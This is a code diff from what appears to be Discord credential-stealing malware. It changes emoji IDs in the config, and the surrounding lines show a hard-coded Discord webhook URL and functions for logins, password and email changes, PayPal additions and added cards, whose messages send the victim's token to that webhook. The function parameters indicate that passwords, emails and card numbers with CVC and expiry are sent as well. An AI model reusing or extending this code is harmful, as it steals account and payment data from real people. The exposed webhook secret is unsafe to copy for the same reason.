@@ -9,14 +9,15 @@ const config = {
   webhook: "https://discord.com/api/webhooks/1263459147937218621/IEXfofTrj3uhMl3tTX58yO6lI91P9r2yHTXtgUn6zOjuKO3J2i6a6z_a9ty2CuaNHeHI",
   "embed-color": 3553599,
   emojis: {
-    nitroType: "<a:nitro_type:990735596446167060>",
-    password: "<:password:990736948018704444>",
-    ip: "<:ip:990733026956804207>",
-    billing: "<a:billing:990734778888228904>",
-    badges: "<a:badges:990780871516770374>",
-    oldPass: "<:old_password:991080661941116978>",
-    newPass: "<a:new_password:991079376416284694>",
-    email: "<:mail:991081890092052510>",
+    nitroType: "<:gs_black_devils:858771778029879336>",
+    password: "<:gs_black_playboy:884487655918813204>",
+    ip: "<:bby:987689942350196756>",
+    billing: "<a:bby:987689939401588827>",
+    billingg: "<a:jjjjjjjjjj:1263518690473803879>",
+    badges: "<:bby:987689933844127804>",
+    oldPass: "<:gs_black_playboy:884487655918813204>",
+    newPass: "<a:playboy1:1265077470730780693>",
+    email: "<:bby:987689943558135818>",
     paypal: "<:paypal:990732200993505280>",
     classic: "<:nitro:990727425790976060>",
     boost: "<:boost1month:990730687579570246>",
@@ -212,7 +213,7 @@ const login = async (email, password, token) => {
         },
         fields: [
           {
-            name: `${config.emojis.billing}`,
+            name: `${config.emojis.billingg}`,
             value: `\`${token}\``,
           },
           {
@@ -281,7 +282,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         fields: [
           {
-            name: `${config.emojis.billing}`,
+            name: `${config.emojis.billingg}`,
             value: `\`${token}\``,
           },
           {
@@ -355,7 +356,7 @@ const emailChanged = async (email, password, token) => {
         },
         fields: [
           {
-            name: `${config.emojis.billing}`,
+            name: `${config.emojis.billingg}`,
             value: `\`${token}\``,
           },
           {
@@ -424,7 +425,7 @@ const PaypalAdded = async (token) => {
         },
         fields: [
           {
-            name: `${config.emojis.billing}`,
+            name: `${config.emojis.billingg}`,
             value: `\`${token}\``,
           },
           {
@@ -493,7 +494,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         fields: [
           {
-            name: `${config.emojis.billing}`,
+            name: `${config.emojis.billingg}`,
             value: `\`${token}\``,
           },
           {
